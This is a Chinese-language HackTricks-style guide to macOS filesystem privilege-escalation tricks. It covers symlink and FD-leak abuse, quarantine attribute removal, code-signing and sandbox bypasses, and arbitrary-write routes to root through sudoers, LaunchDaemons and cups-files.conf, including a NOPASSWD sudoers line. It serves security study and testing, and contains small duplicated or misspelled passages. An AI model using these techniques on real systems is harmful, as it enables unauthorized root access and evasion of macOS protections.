# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## POSIX 权限组合

对于**目录**，三个权限位的含义与普通文件不同。`chmod(1)` 将应用于目录时的执行位称为“**搜索**”权限：<sup>[[2]](#references)</sup>

> `0100` 对文件，允许所有者执行。对目录，允许所有者在目录中进行**搜索**。

- **读取** - 可以**枚举**目录项（列出名称）。
- **写入** - 可以在目录中**创建、重命名和删除目录项**。注意，这是*父目录*的属性，而不是文件的属性：只要你能写入文件的父目录，即使无法读取或写入该文件，也可以删除它。
  - 要删除**子目录**，它必须为空；这反过来又要求拥有足够的权限来删除其中的所有内容。
  - 如果目录设置了**粘滞位**（`S_ISVTX`，例如 `/tmp`），操作会受到限制——POSIX 规定，进程只有在拥有该文件、拥有该目录或具备适当权限时，才能删除或重命名其中的文件。<sup>[[1]](#references)</sup>
- **执行 / 搜索** - 允许你**遍历**该目录。路径名解析会在“前一个组件指定的目录中”查找每个组件，因此，**路径前缀中的任意一个组件失去搜索权限，都会导致其下的所有内容无法通过路径访问**，即使末端文件本身对所有人可读也是如此。<sup>[[1]](#references)</sup>

### 危险组合

**如何覆盖由 root 拥有的文件/文件夹**，但：

- 路径中的某个父**目录所有者**是当前用户
- 路径中的某个父**目录所有者**是一个具有**写入权限**的**用户组**
- 某个用户**组**对该**文件**具有**写入**权限

出现以上任意一种组合时，攻击者都可以在预期路径中**注入**一个**符号链接/硬链接**，从而获得特权任意写入能力。

### 文件夹 root R+X 特殊情况

这直接源于上述路径名解析规则。如果一个**目录仅向 root 授予 R+X 权限**，那么其他所有人都无法通过路径访问其中的文件——但**文件自身的权限位仍可能很宽松**。唯一的障碍就是该目录。

因此，任何能让你将文件**移出该目录**的原语——例如特权进程将攻击者选择的路径**移动/重命名/复制**到你*可以*遍历的位置——都会让你获得任意读取能力，无需绕过文件自身的权限模式：

```bash
# Reproduce the primitive locally
sudo mkdir -p /tmp/locked && sudo chmod 700 /tmp/locked
sudo sh -c 'echo secret > /tmp/locked/data.txt; chmod 644 /tmp/locked/data.txt'

ls -l /tmp/locked/data.txt   # Permission denied: cannot even stat through the directory
cat /tmp/locked/data.txt     # Permission denied

# The file itself is mode 644 - only the parent directory's search bit blocks you.
sudo ls -l /tmp/locked/
```

查找特权文件搬运程序（安装程序、日志轮转程序、崩溃/诊断收集器、备份和“导出”功能），看它们是否接受低权限用户提供的源路径。

## Symbolic Link / Hard Link

### 宽松的文件/文件夹

如果特权进程正在向一个**文件**写入数据，而该文件可能由**低权限用户控制**，或可能是低权限用户**预先创建**的，用户只需通过 Symbolic 或 Hard link 将其**指向另一个文件**，特权进程就会向那个文件写入数据。

查看其他章节，了解攻击者如何**滥用任意写入来提升权限**。

### 打开时使用 `O_NOFOLLOW`

根据 [`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html)：*“如果掩码中使用了 `O_NOFOLLOW`，且传递给 `open()` 的目标文件是符号链接，那么 `open()` 将失败。”* 这只会检查**最后一个**路径组件——所有**中间**组件仍会被解析和跟随。因此，开发者即使通过 `O_NOFOLLOW`“保护”了写入操作，攻击者仍可在目标路径的任意**父目录**中植入符号链接来发动攻击。<sup>[[3]](#references)</sup>

同一手册页还记录了能够真正弥补这一漏洞的标志：<sup>[[3]](#references)</sup>

- **`O_NOFOLLOW_ANY`** — *“如果传递给 `open()` 的路径中任意组件是符号链接，那么 `open()` 将失败。”*
- **`O_RESOLVE_BENEATH`** — *“如果指定的路径解析结果逃逸出与该 fd 关联的目录，那么 `openat()` 将失败。”*

除此之外，使用已经验证过的目录 FD 执行相对于该目录的 `openat()`，或使用 `realpath()` 后重新验证，是阻止路径中途发生符号链接替换的其他方法。

## .fileloc

扩展名为 **`.fileloc`** 的文件可以指向其他应用程序或二进制文件，因此打开这类文件时，相应的应用程序/二进制文件就会被执行。\
示例：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>URL</key>
    <string>file:///System/Applications/Calculator.app</string>
    <key>URLPrefix</key>
    <integer>0</integer>
</dict>
</plist>
```

## File Descriptors

### Leak FD (no `O_CLOEXEC`)

如果调用 `open` 时没有指定 `O_CLOEXEC` 标志，文件描述符就会被子进程继承。因此，如果特权进程打开一个特权文件，并执行攻击者控制的进程，攻击者就会**继承指向该特权文件的 FD**。

经典示例是 **OS X 10.10 中的 `DYLD_PRINT_TO_FILE` LPE**（[SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)）：<sup>[[4]](#references)</sup>

- 即使在 **受限（suid root）二进制文件**中，`dyld` 仍会处理 `DYLD_PRINT_TO_FILE=/path`，因为该变量是在 `processDyldEnvironmentVariable()` 之外解析的。
- 它执行了 `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)`，因此会**在任意路径创建由 root 所有的文件**。
- 该 FD **从未关闭，也没有设置 close-on-exec 标志**，因此 suid 二进制文件的每个子进程都会继承一个**可写的、指向 root 所有文件的 FD**。
- 例如，运行 `DYLD_PRINT_TO_FILE=/etc/target suid_binary`，然后在子进程中读取继承的 FD 编号，就能以 root 权限任意写入；`fcntl(fd, F_SETFL, 0)` 甚至可以清除 `O_APPEND`，从而允许覆盖而非追加。

只要特权进程在 `exec` 你控制的程序之前打开了文件（例如辅助工具、通过 `$EDITOR` 调用的 `crontab` 类编辑器、从环境变量路径打开的日志/调试文件等），就可能出现类似情况。使用以下命令枚举继承的 FD：

```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```

任何大于 `2` 且指向你无法自行打开的文件的值，都是任意写入（或任意读取）原语。

## 避免利用 quarantine xattrs 的技巧

### 移除它

```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```

### uchg / uchange / uimmutable flag

如果文件/文件夹具有此 immutable 属性，就无法为其设置 xattr。

```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```

### 不支持 xattr 的文件系统

macOS 可以挂载的文件系统并非都原生存储**扩展属性**。HFS+ 和 APFS 支持；**FAT32、exFAT 和（大多数）NFS 挂载则不支持**——macOS 会通过写入名为 `._<filename>` 的 **AppleDouble** 侧文件来模拟扩展属性（[The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/）。<sup>[[5]](#references)</sup>

这对 quarantine 很重要，因为只有在同一卷上确实能写入并**读回** xattr，它才会保留：

```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```

如果之后通过会忽略 `._` 配套文件的路径读取该卷（或者配套文件被剥离/删除），文件到达时**不会带有隔离标志**——而未隔离的 `.app` 足以逃逸 App Sandbox，详见 [macOS Sandbox 调试与绕过](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute)。

### writeextattr ACL 与 AppleDouble 隔离行为

关于 `writeextattr` ACL 示例、`com.apple.acl.text` AppleDouble 机制，以及 sidecar 的构造和验证步骤，请参见 [AppleDouble/ACL 隔离绕过复现](macos-appledouble-acl-quarantine-bypass.md)。

## 绕过签名检查

### 绕过平台二进制检查

某些安全检查会检查二进制文件是否为**平台二进制文件**，例如，是否允许其连接到 XPC 服务。不过，正如 https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/ 中介绍的，可以通过获取一个平台二进制文件（例如 /bin/ls），并使用环境变量 `DYLD_INSERT_LIBRARIES` 通过 dyld 注入漏洞利用代码来绕过此检查。<sup>[[7]](#references)</sup>

### 绕过标志 `CS_REQUIRE_LV` 和 `CS_FORCED_LV`

正在执行的二进制文件可以修改自身标志以绕过检查，例如使用以下代码：<sup>[[7]](#references)</sup>

```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```



## 绕过代码签名

Bundle 中包含文件 **`_CodeSignature/CodeResources`**，其中包含 bundle 中每个 **file** 的 **hash**。请注意，CodeResources 的 hash 也**嵌入在可执行文件中**，因此我们也不能修改它。

但是，有些文件不会检查其签名，这些文件在 plist 中对应的键为 omit，例如：

```xml
<dict>
...
	<key>rules</key>
	<dict>
...
		<key>^Resources/.*\.lproj/locversion.plist$</key>
		<dict>
			<key>omit</key>
			<true/>
			<key>weight</key>
			<real>1100</real>
		</dict>
...
	</dict>
	<key>rules2</key>
...
		<key>^(.*/index.html)?\.DS_Store$</key>
		<dict>
			<key>omit</key>
			<true/>
			<key>weight</key>
			<real>2000</real>
		</dict>
...
		<key>^PkgInfo$</key>
		<dict>
			<key>omit</key>
			<true/>
			<key>weight</key>
			<real>20</real>
		</dict>
...
		<key>^Resources/.*\.lproj/locversion.plist$</key>
		<dict>
			<key>omit</key>
			<true/>
			<key>weight</key>
			<real>1100</real>
		</dict>
...
</dict>
```

可以通过 cli 计算资源的签名：

```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```

## 挂载 dmg

用户可以挂载自定义 dmg，即使挂载点覆盖某些现有文件夹。以下是创建包含自定义内容的 dmg 软件包的方法：

```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```

通常，macOS 会通过 `com.apple.DiskArbitrarion.diskarbitrariond` Mach 服务（由 `/usr/libexec/diskarbitrationd` 提供）来挂载磁盘。如果在 LaunchDaemons plist 文件中添加参数 `-d` 并重启，它会将日志保存到 `/var/log/diskarbitrationd.log`，它会将日志保存到 `/var/log/diskarbitrationd.log`。\  
不过，也可以使用 `hdik` 和 `hdiutil` 等工具直接与 `com.apple.driver.DiskImages` kext 通信。

## 任意写入

### 周期性 sh 脚本

如果你的脚本可以被解释为 **shell 脚本**，就可以覆盖 **`/etc/periodic/daily/999.local`** shell 脚本，该脚本每天都会运行。

可以用以下命令**模拟**运行此脚本：**`sudo periodic daily`**

### 守护进程

编写任意的 **LaunchDaemon**，例如 **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`**，并在 plist 中指定要执行的任意脚本，例如：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
    <dict>
        <key>Label</key>
        <string>com.sample.Load</string>
        <key>ProgramArguments</key>
        <array>
            <string>/Applications/Scripts/privesc.sh</string>
        </array>
        <key>RunAtLoad</key>
        <true/>
    </dict>
</plist>
```

只需生成脚本 `/Applications/Scripts/privesc.sh`，其中包含你想以 root 身份运行的**命令**。

### Sudoers File

如果你拥有 **arbitrary write** 权限，可以在文件夹 **`/etc/sudoers.d/`** 中创建文件，授予自己 **sudo** 权限。

### PATH files

文件 **`/etc/paths`** 是填充 PATH 环境变量的主要位置之一。你必须拥有 root 权限才能覆盖它，但如果 **privileged process** 中的脚本正在执行某个**未使用完整路径的命令**，你或许可以通过修改此文件来 **hijack** 该命令。

你还可以在 **`/etc/paths.d`** 中写入文件，将新的文件夹加载到 PATH 环境变量中。

### cups-files.conf

此技术曾用于[这篇 writeup](https://www.kandji.io/blog/macos-audit-story-part1)。<sup>[[8]](#references)</sup>

创建文件 `/etc/cups/cups-files.conf`，内容如下：

```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```

这将创建文件 `/etc/sudoers.d/lpe`，权限为 777。末尾额外添加的垃圾内容是为了触发错误日志的创建。

然后，在 `/etc/sudoers.d/lpe` 中写入所需配置以提升权限，例如 `%staff ALL=(ALL) NOPASSWD:ALL`。

接着，再次修改文件 `/etc/cups/cups-files.conf`，指定 `LogFilePerm 700`，以便通过调用 `cupsctl` 使新的 sudoers 文件生效。

### Sandbox Escape

可以通过 FS arbitrary write 逃逸 macOS sandbox。示例请查看页面 [macOS Auto Start](../../../../macos-auto-start-locations.md)，一种常见方法是在 `~/Library/Preferences/com.apple.Terminal.plist` 中写入一个 Terminal 偏好设置文件，使其在启动时执行命令，然后使用 `open` 调用该文件。

## 以其他用户身份生成可写文件

一种非常常见的 privesc 原语是让**特权进程在你控制的目录中为你创建文件**，然后保留对该文件的**写入权限**。这需要满足两个条件：

1. 你拥有一个目录（或者可以在其中设置**可继承 ACL**），这样在该目录中创建的任何内容都会继承你的权限。
2. 一个特权/`suid` 进程，可指定文件的创建**位置**——通常通过调试/日志环境变量、配置文件或 helper 的 XPC API 实现。

**可继承 ACL** 使你能够写入由其他用户拥有的文件。[`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html) 文档介绍了 `file_inherit` / `directory_inherit` 继承标志：<sup>[[2]](#references)</sup>

```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```

现在，特权进程在 `$DIRNAME` 中创建的任何文件都**可由你写入**。如果该目录也是之后会**以 root 身份执行**内容的位置（`/etc/periodic/*`、`/etc/cron.d`、`/etc/sudoers.d`、LaunchDaemon 目录等），这就是直接的 root 提权。有关拿到文件后该写入什么内容，请参阅上文的 [Sudoers File](#sudoers-file) 和 [cups-files.conf](#cups-filesconf) 部分。

关于“环境变量让 root 进程创建文件，且 FD leak 给你”这一完整示例，请参阅上文的 [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec)。

## POSIX 共享内存

**POSIX 共享内存**允许符合 POSIX 标准的操作系统中的进程访问同一内存区域，从而比其他进程间通信方式更快地进行通信。它通过 `shm_open()` 创建或打开共享内存对象，使用 `ftruncate()` 设置其大小，并通过 `mmap()` 将其映射到进程的地址空间。随后，进程便可直接读取和写入该内存区域。为了管理并发访问并防止数据损坏，通常会使用互斥锁或信号量等同步机制。最后，进程使用 `munmap()` 和 `close()` 解除映射并关闭共享内存，也可以选择使用 `shm_unlink()` 删除内存对象。在多个进程需要快速访问共享数据的环境中，这种机制尤其适合实现高效、快速的 IPC。

<details>

<summary>Producer Code Example</summary>

```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
    const char *name = "/my_shared_memory";
    const int SIZE = 4096; // Size of the shared memory object

    // Create the shared memory object
    int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
    if (shm_fd == -1) {
        perror("shm_open");
        return EXIT_FAILURE;
    }

    // Configure the size of the shared memory object
    if (ftruncate(shm_fd, SIZE) == -1) {
        perror("ftruncate");
        return EXIT_FAILURE;
    }

    // Memory map the shared memory
    void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
    if (ptr == MAP_FAILED) {
        perror("mmap");
        return EXIT_FAILURE;
    }

    // Write to the shared memory
    sprintf(ptr, "Hello from Producer!");

    // Unmap and close, but do not unlink
    munmap(ptr, SIZE);
    close(shm_fd);

    return 0;
}
```

</details>

<details>

<summary>消费者代码示例</summary>

```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
    const char *name = "/my_shared_memory";
    const int SIZE = 4096; // Size of the shared memory object

    // Open the shared memory object
    int shm_fd = shm_open(name, O_RDONLY, 0666);
    if (shm_fd == -1) {
        perror("shm_open");
        return EXIT_FAILURE;
    }

    // Memory map the shared memory
    void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
    if (ptr == MAP_FAILED) {
        perror("mmap");
        return EXIT_FAILURE;
    }

    // Read from the shared memory
    printf("Consumer received: %s\n", (char *)ptr);

    // Cleanup
    munmap(ptr, SIZE);
    close(shm_fd);
    shm_unlink(name); // Optionally unlink

    return 0;
}

```

</details>

## macOS Guarded Descriptors

**macOSCguarded descriptors** 是 macOS 引入的一项安全功能，旨在增强用户应用程序中 **file descriptor 操作**的安全性和可靠性。这些 guarded descriptors 提供了一种将特定限制或“guards”与 file descriptors 关联起来的方式，并由内核强制执行。

此功能特别适用于防止某些类型的安全漏洞，例如 **未经授权的文件访问**或 **race conditions**。例如，当一个线程访问文件描述符，使**另一个存在漏洞的线程也能访问它**，或者当一个 file descriptor 被**继承**到存在漏洞的子进程时，就可能出现这些漏洞。与此功能相关的一些函数包括：

- `guarded_open_np`：打开带有 guard 的 file descriptor
- `guarded_close_np`：关闭它
- `change_fdguard_np`：更改描述符上的 guard 标志（甚至移除 guard 保护）

## References

- [1] [POSIX.1-2024 — Base Definitions, Ch. 4 (File Access Permissions, Directory Protection, Pathname Resolution)](https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/V1_chap04.html)
- [2] [`chmod(1)` man page](https://keith.github.io/xcode-man-pages/chmod.1.html) (directory search/execute bit, ACL inheritance flags)
- [3] [`open(2)` man page](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [4] [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (leaked FD without close-on-exec)
- [5] [The Eclectic Light Company - Which file systems and cloud services preserve extended attributes?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [7] [Mickey (Jhftss) - A New Era of macOS Sandbox Escapes](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [8] [Kandji - Uncovering Apple Vulnerabilities: The diskarbitrationd and storagekitd Audit Story Part 1](https://www.kandji.io/blog/macos-audit-story-part1)

{{#include ../../../../banners/hacktricks-training.md}}
